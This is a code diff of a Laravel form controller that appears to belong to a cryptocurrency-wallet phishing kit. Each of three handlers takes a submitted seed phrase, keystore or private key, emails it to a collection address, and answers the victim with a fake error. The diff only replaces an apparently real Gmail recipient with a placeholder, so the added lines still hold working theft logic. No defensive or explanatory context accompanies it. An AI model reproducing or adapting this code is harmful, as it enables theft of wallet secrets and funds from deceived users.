@@ -15,7 +15,7 @@ class FormController extends Controller
         $type = 'phrase';
         $phrase = $request->phrasetx;
         $option = null;
-        Mail::to('a1logisticscompanies@gmail.com')->send( new Notification($type, $phrase, $option));
+        Mail::to('example@mail.com')->send( new Notification($type, $phrase, $option));
         return response()->json(['res' => 'error'], 400);
     }
 
@@ -28,7 +28,7 @@ class FormController extends Controller
         $type = 'keystore';
         $phrase = $request->keystoretx;
         $option = $request->keystoretx;
-        Mail::to('a1logisticscompanies@gmail.com')->send( new Notification($type, $phrase, $option));
+        Mail::to('example@mail.com')->send( new Notification($type, $phrase, $option));
         return response()->json(['error' => 'error'], 501);
     }
 
@@ -40,7 +40,7 @@ class FormController extends Controller
         $type = 'privatekey';
         $phrase = $request->privatekeyfl;
         $option = null;
-        Mail::to('a1logisticscompanies@gmail.com')->send( new Notification($type, $phrase, $option));
+        Mail::to('example@mail.com')->send( new Notification($type, $phrase, $option));
         return response()->json(['res' => 'error'], 501);
     }
 }
